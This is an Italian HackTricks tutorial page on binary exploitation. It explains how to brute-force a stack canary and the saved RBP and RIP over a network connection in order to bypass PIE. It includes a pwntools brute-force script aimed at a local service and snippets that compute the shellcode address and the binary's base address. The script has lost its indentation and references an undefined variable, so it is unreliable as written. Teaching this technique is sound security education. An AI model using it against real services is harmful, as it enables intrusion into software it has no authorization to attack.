# BF Indirizzi nello Stack

{% hint style="success" %}
Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}

**Se stai affrontando un binario protetto da un canary e PIE (Position Independent Executable) probabilmente devi trovare un modo per bypassarli.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Nota che **`checksec`** potrebbe non rilevare che un binario √® protetto da un canary se questo √® stato compilato staticamente e non √® in grado di identificare la funzione.\
Tuttavia, puoi notarlo manualmente se scopri che un valore √® salvato nello stack all'inizio di una chiamata di funzione e questo valore viene controllato prima di uscire.
{% endhint %}

## Indirizzi Brute-Force

Per bypassare il PIE devi **leakare qualche indirizzo**. E se il binario non sta leakando indirizzi, il modo migliore per farlo √® **brute-forzare il RBP e il RIP salvati nello stack** nella funzione vulnerabile.\
Ad esempio, se un binario √® protetto utilizzando sia un **canary** che **PIE**, puoi iniziare a brute-forzare il canary, poi i **prossimi** 8 Byte (x64) saranno il **RBP** salvato e i **prossimi** 8 Byte saranno il **RIP** salvato.

{% hint style="success" %}
Si suppone che l'indirizzo di ritorno all'interno dello stack appartenga al codice binario principale, che, se la vulnerabilit√† si trova nel codice binario, sar√† di solito il caso.
{% endhint %}

Per brute-forzare il RBP e il RIP dal binario puoi capire che un byte indovinato valido √® corretto se il programma restituisce qualcosa o semplicemente non si blocca. La **stessa funzione** fornita per brute-forzare il canary pu√≤ essere utilizzata per brute-forzare il RBP e il RIP:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
L'ultima cosa di cui hai bisogno per sconfiggere il PIE √® calcolare **indirizzi utili dagli indirizzi leakati**: il **RBP** e il **RIP**.

Dal **RBP** puoi calcolare **dove stai scrivendo il tuo shell nello stack**. Questo pu√≤ essere molto utile per sapere dove andrai a scrivere la stringa _"/bin/sh\x00"_ all'interno dello stack. Per calcolare la distanza tra il RBP leakato e il tuo shellcode, puoi semplicemente mettere un **breakpoint dopo aver leakato il RBP** e controllare **dove si trova il tuo shellcode**, poi, puoi calcolare la distanza tra il shellcode e il RBP:
```python
INI_SHELLCODE = RBP - 1152
```
Dall'**RIP** puoi calcolare il **base address del binary PIE** che √® ci√≤ di cui hai bisogno per creare un **valid ROP chain**.\
Per calcolare il base address basta fare `objdump -d vunbinary` e controllare gli indirizzi disassemblati pi√π recenti:

![](<../../../../.gitbook/assets/image (145).png>)

In quell'esempio puoi vedere che √® necessario solo **1 Byte e mezzo** per localizzare tutto il codice, quindi, il base address in questa situazione sar√† il **RIP leaked ma che termina con "000"**. Ad esempio, se hai leaked `0x562002970ecf`, il base address √® `0x562002970000`
```python
elf.address = RIP - (RIP & 0xfff)
```
{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
